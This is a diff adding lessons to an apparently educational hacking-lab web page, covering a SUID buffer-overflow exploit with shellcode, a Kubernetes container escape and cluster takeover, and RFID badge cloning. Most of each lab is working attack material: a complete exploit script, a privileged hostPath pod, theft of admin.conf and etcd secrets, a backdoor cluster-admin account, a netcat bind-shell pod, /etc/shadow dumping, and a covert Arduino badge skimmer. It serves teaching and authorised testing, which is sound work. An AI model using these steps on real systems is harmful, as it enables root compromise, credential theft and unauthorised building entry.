@@ -12675,6 +12675,1493 @@ grep -r "curl\\|wget\\|scp\\|ftp" /mnt/evidence/home/jsmith/.bash_history
 # Time taken: ~5 hours
 # Difficulty: Intermediate (requires forensics knowledge)</div>
 
+            <h3>Lab 6: Complete Buffer Overflow Exploitation (Binary Exploitation)</h3>
+
+            <p><strong>Scenario:</strong> You've discovered a vulnerable Linux binary running as a SUID root program. It has a stack-based buffer overflow. Your mission: develop a working exploit that spawns a root shell. This lab teaches memory corruption, shellcode injection, and return address overwrit
+
+ing—foundation skills for exploit development!</p>
+
+            <div class="info-box">
+                <h4>Prerequisites</h4>
+                <p>• Basic understanding of C programming<br>
+                • Familiarity with x86/x64 assembly (registers, stack, instructions)<br>
+                • GDB debugging basics<br>
+                • Linux command line proficiency<br>
+                • Python scripting (for exploit development)</p>
+            </div>
+
+            <h4>Step 1: Environment Setup & Binary Analysis</h4>
+
+            <div class="code"># Download vulnerable binary (or compile your own):
+# Sample vulnerable program (vuln.c):
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // No bounds checking!
+}
+
+int main(int argc, char **argv) {
+    if (argc < 2) {
+        printf("Usage: %s <input>\\n", argv[0]);
+        return 1;
+    }
+    vulnerable_function(argv[1]);
+    printf("Execution complete\\n");
+    return 0;
+}
+
+# Compile with protections DISABLED (for learning):
+gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32
+
+# Flags explained:
+# -fno-stack-protector  = Disable stack canaries
+# -z execstack          = Make stack executable (allow shellcode)
+# -no-pie               = Disable ASLR for binary
+# -m32                  = Compile as 32-bit (easier to exploit)
+
+# Set SUID (simulate privileged service):
+sudo chown root:root vuln
+sudo chmod 4755 vuln
+
+# Verify:
+ls -la vuln
+# Output: -rwsr-xr-x 1 root root 15632 Jan  9 12:00 vuln
+
+# Check protections:
+checksec vuln
+
+# Output:
+# RELRO:    Partial RELRO
+# Stack:    No canary found
+# NX:       NX disabled
+# PIE:      No PIE (0x8048000)
+# Arch:     i386-32-little</div>
+
+            <h4>Step 2: Crash the Program (Proof of Vulnerability)</h4>
+
+            <div class="code"># Test with normal input:
+./vuln AAAA
+# Output: Execution complete
+
+# Test with long input (overflow):
+./vuln $(python3 -c 'print("A"*100)')
+
+# Output: Segmentation fault (core dumped)
+
+# Success! We crashed the program.
+# This means we overwrote something critical (likely the return address)
+
+# Generate pattern to find offset (where exactly do we control EIP?):
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
+
+# Output (unique pattern):
+# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+# Run with pattern:
+./vuln "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
+
+# Debug with GDB:
+gdb ./vuln
+
+(gdb) run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
+
+# Program crashes
+# Output:
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x37634136 in ?? ()
+
+# The value 0x37634136 is the instruction pointer (EIP)
+# This is where the return address should be!
+
+# Find offset:
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37634136
+
+# Output:
+# [*] Exact match at offset 76
+
+# Perfect! After 76 bytes of junk, the next 4 bytes control EIP!</div>
+
+            <h4>Step 3: Control Execution (Overwrite Return Address)</h4>
+
+            <div class="code"># Test our offset:
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"BBBB")' > payload.bin
+
+# Run with payload:
+./vuln $(cat payload.bin)
+
+# In GDB:
+gdb ./vuln
+(gdb) run $(python3 -c 'print("A"*76 + "BBBB")')
+
+# Crash at:
+# 0x42424242 in ?? ()
+
+# 0x42 = 'B' in hexadecimal
+# We control EIP! We can redirect execution anywhere!
+
+# Next: Where do we jump to?
+# Option 1: Jump directly to shellcode in our buffer
+# Option 2: ret2libc (use existing functions)
+# Option 3: ROP chain (modern technique)
+
+# For this lab: Jump to shellcode in buffer</div>
+
+            <h4>Step 4: Generate Shellcode</h4>
+
+            <div class="code"># Generate shellcode with msfvenom:
+msfvenom -p linux/x86/exec CMD=/bin/sh -b '\\x00\\x0a\\x0d' -f python
+
+# Flags:
+# -p linux/x86/exec    = Payload (execute command)
+# CMD=/bin/sh          = Command to execute
+# -b '\\x00\\x0a\\x0d'  = Bad characters to avoid (NULL, newline, carriage return)
+# -f python            = Output format (Python byte string)
+
+# Output:
+buf =  b""
+buf += b"\\xd9\\xc1\\xd9\\x74\\x24\\xf4\\x5e\\x33\\xc9\\xb1"
+buf += b"\\x0b\\x31\\x76\\x15\\x03\\x76\\x15\\x83\\xee\\xfc"
+buf += b"\\x76\\x53\\x4f\\x68\\x57\\xe0\\xc1\\xd3\\xc1\\xa8"
+buf += b"\\x9c\\xe8\\xeb\\xf7\\xdf\\xaa\\x4f\\x48\\x70\\x3e"
+buf += b"\\x40\\xfa\\x21\\x4f\\xae\\xe2\\xc9\\x3f\\xe1\\x58"
+buf += b"\\x3c\\x63\\x28\\xe1\\xdc"
+
+# Shellcode is 53 bytes long
+
+# NOP sled (for reliability):
+# Add NOPs before shellcode so we don't need exact address
+# NOP = \\x90 (do nothing instruction)
+
+# Final payload structure:
+# [NOPs] + [Shellcode] + [Padding] + [Return Address]</div>
+
+            <h4>Step 5: Find Return Address (Where is our buffer?)</h4>
+
+            <div class="code"># We need to find where our buffer is in memory
+
+# Use GDB:
+gdb ./vuln
+
+# Set breakpoint before overflow:
+(gdb) disassemble vulnerable_function
+# Find address of strcpy call, set breakpoint after it
+
+(gdb) break *0x08048492  # Address after strcpy
+
+# Run with large input:
+(gdb) run $(python3 -c 'print("A"*100)')
+
+# Breakpoint hit
+
+# Examine stack:
+(gdb) x/40wx $esp
+
+# Output:
+# 0xbffff5c0:	0x41414141	0x41414141	0x41414141	0x41414141
+# 0xbffff5d0:	0x41414141	0x41414141	0x41414141	0x41414141
+# ...
+
+# Our buffer starts around 0xbffff5c0!
+
+# Choose return address in the middle of NOPs:
+# Let's use: 0xbffff5d0
+
+# Note: ASLR disabled, so address is consistent</div>
+
+            <h4>Step 6: Craft Final Exploit</h4>
+
+            <div class="code"># exploit.py
+import struct
+
+# Shellcode (execve("/bin/sh"))
+shellcode = (
+    b"\\xd9\\xc1\\xd9\\x74\\x24\\xf4\\x5e\\x33\\xc9\\xb1"
+    b"\\x0b\\x31\\x76\\x15\\x03\\x76\\x15\\x83\\xee\\xfc"
+    b"\\x76\\x53\\x4f\\x68\\x57\\xe0\\xc1\\xd3\\xc1\\xa8"
+    b"\\x9c\\xe8\\xeb\\xf7\\xdf\\xaa\\x4f\\x48\\x70\\x3e"
+    b"\\x40\\xfa\\x21\\x4f\\xae\\xe2\\xc9\\x3f\\xe1\\x58"
+    b"\\x3c\\x63\\x28\\xe1\\xdc"
+)
+
+# Return address (points to NOP sled)
+ret_addr = 0xbffff5d0
+
+# Payload construction:
+nops = b"\\x90" * 20          # NOP sled
+payload = nops + shellcode     # NOPs + shellcode
+
+# Calculate padding needed:
+offset = 76
+padding_size = offset - len(payload)
+padding = b"A" * padding_size
+
+# Pack return address (little-endian):
+ret_addr_packed = struct.pack("<I", ret_addr)
+
+# Final payload:
+exploit = payload + padding + ret_addr_packed
+
+# Print payload (to pipe into program):
+print(exploit.decode('latin-1'))
+
+# Save to file:
+with open("exploit.bin", "wb") as f:
+    f.write(exploit)
+
+print(f"[+] Exploit generated: {len(exploit)} bytes")
+print(f"[+] Return address: 0x{ret_addr:08x}")
+print(f"[+] Payload: NOPs={len(nops)}, Shellcode={len(shellcode)}, Padding={padding_size}")</div>
+
+            <h4>Step 7: Execute Exploit (Get Root Shell!)</h4>
+
+            <div class="code"># Generate exploit:
+python3 exploit.py > payload
+
+# Test exploit:
+./vuln "$(cat payload)"
+
+# If successful:
+# $ id
+# uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
+# 
+# $ whoami
+# root
+
+# Success! We have root shell!
+
+# The SUID bit caused the program to run with root privileges
+# Our buffer overflow hijacked execution flow
+# Shellcode executed as root = root shell!
+
+# Clean up:
+exit  # Exit root shell
+rm payload exploit.bin
+
+# What happened step-by-step:
+# 1. Program copies our input into 64-byte buffer
+# 2. Our input is 76+ bytes (overflow!)
+# 3. Overflow overwrites return address on stack
+# 4. Return address points to our NOP sled
+# 5. CPU slides down NOPs to shellcode
+# 6. Shellcode executes: execve("/bin/sh", NULL, NULL)
+# 7. New shell spawned with SUID privileges (root!)</div>
+
+            <h4>Step 8: Modern Protections (Why This Works in 2026)</h4>
+
+            <div class="code"># This exploit worked because we DISABLED protections
+# Real-world binaries have:
+
+# 1. Stack Canaries (SSP):
+# • Random value placed before return address
+# • Checked before function returns
+# • If modified → program aborts
+# Bypass: Leak canary value, include in payload
+
+# 2. NX (Non-Executable Stack):
+# • Stack marked as non-executable
+# • Shellcode on stack won't run
+# Bypass: ROP chains (ret2libc, ret2plt)
+
+# 3. ASLR (Address Space Layout Randomization):
+# • Randomizes memory addresses each run
+# • Our hardcoded address (0xbffff5d0) won't work
+# Bypass: Information leak to reveal addresses
+
+# 4. PIE (Position Independent Executable):
+# • Binary loaded at random address
+# • Function addresses change each run
+# Bypass: Information leak + ROP gadgets
+
+# 5. RELRO (Relocation Read-Only):
+# • GOT (Global Offset Table) is read-only
+# • Can't overwrite function pointers
+# Bypass: Find other writable targets
+
+# Modern exploit development = bypassing all these protections
+# Requires: Information leaks + ROP chains + heap exploitation
+
+# Check real binary protections:
+checksec /bin/ls
+
+# Output:
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+
+# All protections enabled = much harder to exploit!</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Lab 6 Key Takeaways</h4>
+                <p><strong>Skills learned:</strong><br>
+                • Binary analysis with checksec<br>
+                • GDB debugging (finding offsets, examining memory)<br>
+                • Pattern creation/offset calculation (Metasploit tools)<br>
+                • Shellcode generation (msfvenom)<br>
+                • Buffer overflow exploitation (stack smashing)<br>
+                • SUID privilege escalation<br>
+                • Understanding modern protections (DEP, ASLR, canaries)<br><br>
+                <strong>Next steps:</strong><br>
+                • Practice on: PicoCTF, pwnable.kr, pwnable.tw<br>
+                • Learn ROP chains (bypass NX)<br>
+                • Learn heap exploitation (different attack surface)<br>
+                • Study ASLR bypass techniques (info leaks)<br>
+                • Read: "The Shellcoder's Handbook," "Hacking: The Art of Exploitation"<br><br>
+                Buffer overflows are THE classic exploit. Master this = understand memory corruption at the deepest level! 🐛💻</p>
+            </div>
+
+            <h3>Lab 7: Container Escape & Kubernetes Exploitation (Cloud-Native Security)</h3>
+
+            <p><strong>Scenario:</strong> You've compromised a web application running inside a Docker container in a Kubernetes cluster. Your mission: escape the container, pivot to other pods, compromise the Kubernetes API server, and gain cluster admin access. This lab teaches container security, Kubernetes enumeration, and cloud-native attack paths—essential skills for modern pentesting!</p>
+
+            <h4>Step 1: Initial Foothold (Web Shell in Container)</h4>
+
+            <div class="code"># Assume you've gained RCE via web vulnerability (SQLi, file upload, etc.)
+# You have a web shell in the container
+
+# Check environment:
+id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+hostname
+# webapp-deployment-5d7c6b9f8d-x4m2p
+
+uname -a
+# Linux webapp-deployment-5d7c6b9f8d-x4m2p 5.10.0-21-cloud-amd64 #1 SMP Debian GNU/Linux
+
+# Confirm we're in a container:
+cat /proc/1/cgroup | grep -i docker
+# 12:cpuset:/docker/4a5b8c9d3e2f...
+
+# Or check for Kubernetes:
+cat /proc/1/cgroup | grep -i kubepods
+# 12:cpuset:/kubepods/besteffort/pod123abc.../4a5b8c9d...
+
+# We're in Kubernetes!</div>
+
+            <h4>Step 2: Container Enumeration</h4>
+
+            <div class="code"># Check for misconfigurations:
+
+# 1. Mounted Docker socket (common misconfiguration!):
+ls -la /var/run/docker.sock
+# If exists → instant root via Docker API!
+
+# 2. Privileged container:
+cat /proc/self/status | grep CapEff
+# CapEff: 0000003fffffffff = ALL capabilities = privileged!
+
+# 3. Mounted host filesystem:
+ls -la /host
+ls -la /mnt
+# Look for host root filesystem mounts
+
+# 4. Kubernetes service account:
+ls -la /var/run/secrets/kubernetes.io/serviceaccount/
+# token    = JWT for Kubernetes API
+# ca.crt   = CA certificate
+# namespace = Current namespace
+
+# Read service account token:
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+# eyJhbGciOiJSUzI1NiIsImtpZCI6Ij...
+
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# 5. Check environment variables:
+env | grep -i kube
+# KUBERNETES_SERVICE_HOST=10.96.0.1
+# KUBERNETES_SERVICE_PORT=443
+
+# 6. Network enumeration:
+ip addr
+# Usually only sees container network (eth0: 10.244.x.x)
+
+# Can we reach Kubernetes API?
+curl -k https://10.96.0.1:443
+# {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden..."}
+
+# Kubernetes API is accessible!</div>
+
+            <h4>Step 3: Kubernetes API Reconnaissance</h4>
+
+            <div class="code"># Query API with service account token:
+
+# Test authentication:
+curl -k -H "Authorization: Bearer $TOKEN" \\
+  https://10.96.0.1:443/api/v1/namespaces/default/pods
+
+# Response:
+# {"kind":"PodList","apiVersion":"v1","items":[...]}
+
+# Success! Our service account can list pods
+
+# Enumerate permissions:
+
+# List pods:
+curl -k -H "Authorization: Bearer $TOKEN" \\
+  https://10.96.0.1:443/api/v1/namespaces/default/pods | jq '.items[].metadata.name'
+
+# Output:
+# "webapp-deployment-5d7c6b9f8d-x4m2p"  # Us!
+# "redis-master-0"
+# "postgres-0"
+
+# List namespaces:
+curl -k -H "Authorization: Bearer $TOKEN" \\
+  https://10.96.0.1:443/api/v1/namespaces | jq '.items[].metadata.name'
+
+# Output:
+# "default"
+# "kube-system"  # Critical namespace!
+# "kube-public"
+
+# Try to list kube-system pods:
+curl -k -H "Authorization: Bearer $TOKEN" \\
+  https://10.96.0.1:443/api/v1/namespaces/kube-system/pods
+
+# If FORBIDDEN → no access to kube-system (yet)
+# If SUCCESS → we can see system pods!
+
+# List secrets:
+curl -k -H "Authorization: Bearer $TOKEN" \\
+  https://10.96.0.1:443/api/v1/namespaces/default/secrets
+
+# Secrets contain credentials, certificates, tokens!
+
+# Try to create pods (escalation path):
+curl -k -H "Authorization: Bearer $TOKEN" \\
+  -H "Content-Type: application/json" \\
+  -X POST \\
+  -d @test-pod.json \\
+  https://10.96.0.1:443/api/v1/namespaces/default/pods
+
+# If FORBIDDEN → can't create pods
+# If SUCCESS → we can deploy our own pods!</div>
+
+            <h4>Step 4: Container Escape via Privileged Pod</h4>
+
+            <div class="code"># If we can create pods, deploy privileged pod:
+
+# Create malicious pod spec (evil-pod.json):
+{
+  "apiVersion": "v1",
+  "kind": "Pod",
+  "metadata": {
+    "name": "evil-pod",
+    "namespace": "default"
+  },
+  "spec": {
+    "containers": [{
+      "name": "evil",
+      "image": "ubuntu:latest",
+      "command": ["/bin/bash", "-c", "sleep 3600"],
+      "securityContext": {
+        "privileged": true
+      },
+      "volumeMounts": [{
+        "name": "host-root",
+        "mountPath": "/host"
+      }]
+    }],
+    "volumes": [{
+      "name": "host-root",
+      "hostPath": {
+        "path": "/",
+        "type": "Directory"
+      }
+    }],
+    "restartPolicy": "Never"
+  }
+}
+
+# Deploy pod:
+curl -k -H "Authorization: Bearer $TOKEN" \\
+  -H "Content-Type: application/json" \\
+  -X POST \\
+  -d @evil-pod.json \\
+  https://10.96.0.1:443/api/v1/namespaces/default/pods
+
+# Wait for pod to start:
+curl -k -H "Authorization: Bearer $TOKEN" \\
+  https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod | jq '.status.phase'
+
+# Output: "Running"
+
+# Get shell in evil pod:
+# (Requires exec endpoint access)
+curl -k -H "Authorization: Bearer $TOKEN" \\
+  https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod/exec?command=/bin/bash&stdin=true&stdout=true&stderr=true&tty=true
+
+# Now in privileged pod with host filesystem at /host!
+
+# Escape to host:
+chroot /host /bin/bash
+
+# Check:
+hostname
+# master-node-01  # We're on the Kubernetes node!
+
+id
+# uid=0(root) gid=0(root) groups=0(root)
+
+# Full root on Kubernetes node!</div>
+
+            <h4>Step 5: Stealing Kubernetes Secrets</h4>
+
+            <div class="code"># From compromised node, access kubelet certs:
+ls -la /etc/kubernetes/
+# admin.conf  = Cluster admin credentials!
+# kubelet.conf
+# controller-manager.conf
+# scheduler.conf
+
+# Copy admin.conf:
+cat /etc/kubernetes/admin.conf
+
+# Output (YAML):
+# apiVersion: v1
+# clusters:
+# - cluster:
+#     certificate-authority-data: LS0tLS1CRUdJTi...
+#     server: https://10.0.0.1:6443
+#   name: kubernetes
+# contexts:
+# - context:
+#     cluster: kubernetes
+#     user: kubernetes-admin
+#   name: kubernetes-admin@kubernetes
+# current-context: kubernetes-admin@kubernetes
+# kind: Config
+# users:
+# - name: kubernetes-admin
+#   user:
+#     client-certificate-data: LS0tLS1CRUdJTi...
+#     client-key-data: LS0tLS1CRUdJTi...
+
+# This kubeconfig provides CLUSTER ADMIN access!
+
+# Use it:
+export KUBECONFIG=/etc/kubernetes/admin.conf
+
+# Or extract and use from attacker machine:
+# 1. Copy admin.conf to attacker
+# 2. kubectl --kubeconfig=admin.conf get pods --all-namespaces
+
+# Alternative: Steal etcd data (Kubernetes database):
+ls -la /var/lib/etcd/
+# etcd contains ALL cluster secrets unencrypted!
+
+# Read secrets from etcd:
+ETCDCTL_API=3 etcdctl --cacert /etc/kubernetes/pki/etcd/ca.crt \\
+  --cert /etc/kubernetes/pki/etcd/server.crt \\
+  --key /etc/kubernetes/pki/etcd/server.key \\
+  get / --prefix --keys-only
+
+# Returns ALL Kubernetes resources (secrets, tokens, passwords!)</div>
+
+            <h4>Step 6: Cluster Takeover</h4>
+
+            <div class="code"># With cluster admin access:
+
+# List all secrets:
+kubectl get secrets --all-namespaces
+
+# Dump specific secret:
+kubectl get secret -n kube-system admin-token-xyz -o yaml
+
+# Decode base64:
+echo "BASE64_VALUE" | base64 -d
+
+# Create backdoor admin user:
+kubectl create serviceaccount backdoor -n kube-system
+kubectl create clusterrolebinding backdoor-admin \\
+  --clusterrole=cluster-admin \\
+  --serviceaccount=kube-system:backdoor
+
+# Get backdoor token:
+kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep backdoor | awk '{print $1}')
+
+# Deploy persistent webshell pod:
+kubectl run webshell --image=alpine --restart=Never -- /bin/sh -c "while true; do nc -l -p 4444 -e /bin/sh; done"
+
+# Access all nodes:
+kubectl get nodes
+kubectl exec -it <node-pod> -- /bin/bash
+
+# Exfiltrate data from all pods:
+for pod in $(kubectl get pods --all-namespaces -o name); do
+  kubectl exec $pod -- cat /etc/shadow
+done
+
+# Complete cluster compromise!</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Lab 7 Key Takeaways</h4>
+                <p><strong>Skills learned:</strong><br>
+                • Container fingerprinting (cgroups, filesystem analysis)<br>
+                • Kubernetes service account token usage<br>
+                • Kubernetes API enumeration (pods, secrets, namespaces)<br>
+                • Privileged pod deployment (container escape)<br>
+                • Host filesystem access (chroot escape)<br>
+                • Kubernetes credential theft (admin.conf, etcd)<br>
+                • Cluster takeover (create admin users, deploy backdoors)<br><br>
+                <strong>Key Kubernetes attack paths:</strong><br>
+                1. <strong>Overprivileged service account:</strong> Create pods → deploy privileged pod → escape<br>
+                2. <strong>Mounted Docker socket:</strong> Instant root via Docker API<br>
+                3. <strong>Host path mounts:</strong> Access node filesystem directly<br>
+                4. <strong>Node compromise:</strong> Steal kubelet credentials → cluster admin<br>
+                5. <strong>etcd access:</strong> All secrets in plaintext<br><br>
+                <strong>Defense:</strong><br>
+                • Enable RBAC (least privilege service accounts)<br>
+                • Use Pod Security Policies (PSP) or Pod Security Admission<br>
+                • Never mount Docker socket or host paths<br>
+                • Enable audit logging<br>
+                • Encrypt etcd at rest<br>
+                • Network segmentation (isolate nodes)<br><br>
+                Kubernetes security is critical in 2026—every company runs containers! 🐳☸️</p>
+            </div>
+
+            <h3>Lab 8: Complete RFID Cloning & Badge Duplication (Physical Security)</h3>
+
+            <p><strong>Scenario:</strong> You've been hired to test a company's physical security. They use RFID badges for building access. Your mission: capture a badge signal from an employee, clone it, and gain unauthorized physical access. This lab teaches RFID fundamentals, Proxmark3 usage, badge cloning techniques, and physical security testing—essential for comprehensive red team engagements!</p>
+
+            <h4>Step 1: RFID Basics & Reconnaissance</h4>
+
+            <div class="code"># RFID (Radio-Frequency Identification) types:
+
+# Low Frequency (LF): 125 kHz
+# • HID Prox cards (most common office badges)
+# • EM4100/EM4102 cards
+# • Read range: ~10 cm
+# • Simple, easy to clone
+# • Used in: Office buildings, hotels, parking
+
+# High Frequency (HF): 13.56 MHz
+# • Mifare Classic (common transit cards, hotel keys)
+# • Mifare DESFire (more secure)
+# • iCLASS (government, high-security)
+# • NFC phones operate at this frequency
+# • Read range: ~10 cm
+# • More complex, but still cloneable
+# • Used in: Transit, government, modern offices
+
+# Ultra High Frequency (UHF): 860-960 MHz
+# • Long-range RFID (supply chain, inventory)
+# • Read range: 10+ meters!
+# • Less common for access control
+# • Used in: Warehouses, toll roads
+
+# Our target: HID Prox (125 kHz) - most common office badge</div>
+
+            <h4>Step 2: Equipment Setup (Proxmark3)</h4>
+
+            <div class="code"># Proxmark3 = RFID research tool ($300)
+# Alternatives:
+# • ACR122U (~$40, NFC only)
+# • Flipper Zero (~$200, multi-tool)
+# • Chameleon Mini (~$60, emulation only)
+
+# We'll use Proxmark3 (most powerful)
+
+# Install software:
+sudo apt install proxmark3
+
+# Or compile from source:
+git clone https://github.com/RfidResearchGroup/proxmark3.git
+cd proxmark3
+make clean && make all
+sudo make install
+
+# Connect Proxmark3 via USB
+
+# Start client:
+proxmark3 /dev/ttyACM0
+
+# Output:
+# [=] Session log /root/.proxmark3/logs/log_20260109.txt
+# [+] loaded from JSON file /root/.proxmark3/preferences.json
+# [=] Using UART port /dev/ttyACM0
+# [+] About to use the following device: USB /dev/ttyACM0
+# [+] Communicating with PM3 over USB-CDC
+# 
+#   ██████╗ ███╗   ███╗ ████╗
+#   ██╔══██╗████╗ ████║ ╚══██║
+#   ██████╔╝██╔████╔██║   ██╔╝
+#   ██╔═══╝ ██║╚██╔╝██║   ██║
+#   ██║     ██║ ╚═╝ ██║ ██████║
+#   ╚═╝     ╚═╝     ╚═╝ ╚═════╝
+#
+# proxmark3>
+
+# Check connection:
+proxmark3> hw status
+
+# Verify LF and HF antennas working</div>
+
+            <h4>Step 3: Capture Target Badge (Covert Cloning)</h4>
+
+            <div class="code"># Scenario: Tailgating attack
+# You're behind employee at door, they badge in
+# Your Proxmark3 is in bag/pocket, close to their badge
+
+# Start LF search:
+proxmark3> lf search
+
+# Output (when badge detected):
+# [+] Valid HID Prox ID found!
+# [+] HID Prox TAG ID: 2006ec0c86 (8011)
+# [+] Format: 26-bit (H10301)
+# [+] Facility Code: 123
+# [+] Card Number: 8011
+
+# Success! We captured:
+# • Facility Code: 123
+# • Card Number: 8011
+
+# Alternative: Use auto-read mode (background capture):
+proxmark3> lf hid read
+
+# Leave running, captures when badge is nearby
+
+# Save for later:
+# Write down Facility Code and Card Number
+# Or use built-in clone command immediately</div>
+
+            <h4>Step 4: Clone to Writable Card</h4>
+
+            <div class="code"># You need writable cards:
+# • T5577 cards (LF writable, $1 each)
+# • Order from AliExpress, Amazon, eBay
+
+# Place blank T5577 card on Proxmark3
+
+# Clone directly from captured data:
+proxmark3> lf hid clone --raw 2006ec0c86
+
+# Or use facility code + card number:
+proxmark3> lf hid clone -r 26 -f 123 -n 8011
+
+# Flags:
+# -r = Format (26-bit H10301)
+# -f = Facility code (123)
+# -n = Card number (8011)
+
+# Output:
+# [=] Preparing to clone HID tag
+# [=] Done
+# [?] Try `lf hid reader` to verify
+
+# Verify clone:
+proxmark3> lf hid reader
+
+# Output:
+# [+] HID Prox TAG ID: 2006ec0c86 (8011)
+# [+] Format: 26-bit (H10301)
+# [+] Facility Code: 123
+# [+] Card Number: 8011
+
+# Perfect match! Clone successful!
+
+# Test on access control system:
+# Present cloned card to reader
+# Door should open!</div>
+
+            <h4>Step 5: Advanced Techniques (Mifare Classic)</h4>
+
+            <div class="code"># Mifare Classic cards are more complex (HF 13.56 MHz)
+# Used in: Transit cards, hotel keys, some offices
+
+# Check card type:
+proxmark3> hf search
+
+# Output:
+# [+] Valid Mifare Classic 1K tag found
+
+# Mifare uses encryption (Crypto1)
+# But: Known weaknesses allow cracking
+
+# Attack 1: Known default keys
+proxmark3> hf mf chk --1k -f mfc_default_keys.dic
+
+# Tests common default keys (factory defaults)
+
+# Output:
+# [+] Found valid key [ffffffffffff] (sector 0, A)
+# [+] Found valid key [a0a1a2a3a4a5] (sector 1, A)
+# ... # If many default keys found → easy attack!
+
+# Attack 2: Nested attack (if some keys known):
+proxmark3> hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF
+
+# Uses known key to find other keys
+
+# Attack 3: Hardnested attack (no keys known):
+proxmark3> hf mf hardnested --blk 0 --a --k FFFFFFFFFFFF
+
+# Takes ~5-10 minutes, but very reliable
+
+# Once all keys found, dump card:
+proxmark3> hf mf dump
+
+# Output: hf-mf-<UID>-dump.bin
+
+# Clone to writable card:
+# 1. Buy Chinese Magic Card (UID changeable)
+# 2. proxmark3> hf mf cload -f hf-mf-<UID>-dump.bin
+
+# Perfect clone with matching UID!</div>
+
+            <h4>Step 6: Building an RFID Skimmer (Covert Capture Device)</h4>
+
+            <div class="code"># For long-term access, build skimmer:
+# • Arduino + PN532 NFC module (~$15)
+# • Battery pack
+# • SD card module (logging)
+# • Hide near door reader
+
+# Sample Arduino code (simplified):
+/*
+#include <PN532_I2C.h>
+#include <PN532.h>
+#include <SD.h>
+
+PN532_I2C pn532i2c(Wire);
+PN532 nfc(pn532i2c);
+
+void setup() {
+  Serial.begin(115200);
+  nfc.begin();
+  SD.begin(10);
+}
+
+void loop() {
+  uint8_t uid[7];
+  uint8_t uidLength;
+  
+  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, &uid[0], &uidLength)) {
+    // Card detected!
+    File logFile = SD.open("badges.txt", FILE_WRITE);
+    
+    // Log UID:
+    for (uint8_t i=0; i < uidLength; i++) {
+      logFile.print(uid[i], HEX);
+    }
+    logFile.println();
+    logFile.close();
+    
+    delay(2000); // Debounce
+  }
+}
+*/
+
+# Deploy near reader:
+# • Behind potted plant
+# • Under desk near reader
+# • Inside fake electrical outlet
+
+# Retrieve device after hours/days
+# Analyze captured badges
+# Clone most common badges
+# Gain building access!</div>
+
+            <h4>Step 7: Defense & Detection</h4>
+
+            <div class="code"># How companies defend against RFID cloning:
+
+# 1. Encrypted cards:
+# • iCLASS SE, HID SEOS, DESFire EV2
+# • Mutual authentication (reader verifies card, card verifies reader)
+# • Harder to clone (but not impossible with replay attacks)
+
+# 2. Multi-factor authentication:
+# • Badge + PIN
+# • Badge + biometric
+# • Badge + mobile app
+
+# 3. Challenge-response:
+# • Card must compute response to challenge
+# • Clones won't work (unless you clone secure element)
+
+# 4. Faraday sleeves:
+# • RFID-blocking wallets/badge holders
+# • Prevents unauthorized reads
+
+# 5. Short read range:
+# • Lower power readers
+# • Requires badge very close to reader
+# • Harder for skimmers
+
+# Detection:
+# • Monitor for duplicate badge uses (same badge, different locations, short time)
+# • Video surveillance (correlate badge swipes with faces)
+# • Anomaly detection (badge used at unusual time/location)
+# • Physical inspection for skimmers</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Lab 8 Key Takeaways</h4>
+                <p><strong>Skills learned:</strong><br>
+                • RFID fundamentals (LF vs HF, frequency ranges)<br>
+                • Proxmark3 operation (reading, cloning, emulation)<br>
+                • HID Prox badge cloning (most common access control)<br>
+                • Mifare Classic attacks (default keys, nested, hardnested)<br>
+                • RFID skimmer construction (Arduino + PN532)<br>
+                • Physical security testing methodology<br>
+                • Defense strategies (encrypted cards, multi-factor auth)<br><br>
+                <strong>RFID attack toolkit:</strong><br>
+                • <strong>Proxmark3:</strong> Research tool ($300, most powerful)<br>
+                • <strong>Flipper Zero:</strong> Portable multi-tool ($200, great for field work)<br>
+                • <strong>ACR122U:</strong> Budget NFC reader ($40, HF only)<br>
+                • <strong>HackRF One:</strong> SDR for 433MHz/915MHz ($300)<br>
+                • <strong>T5577 cards:</strong> LF writable ($1/ea)<br>
+                • <strong>Magic Mifare:</strong> UID changeable ($2/ea)<br><br>
+                <strong>Legal warning:</strong><br>
+                • Cloning badges WITHOUT authorization = ILLEGAL<br>
+                • Only test badges you own or have explicit permission<br>
+                • Always document scope of engagement<br>
+                • Physical pentesting requires clear legal agreements<br><br>
+                Physical security is often the weakest link. Companies spend millions on cybersecurity but use $1 RFID badges! 🔐💳</p>
+            </div>
+
+            <h3>Lab 9: Complete SQL Injection to System Takeover (Advanced SQLi)</h3>
+
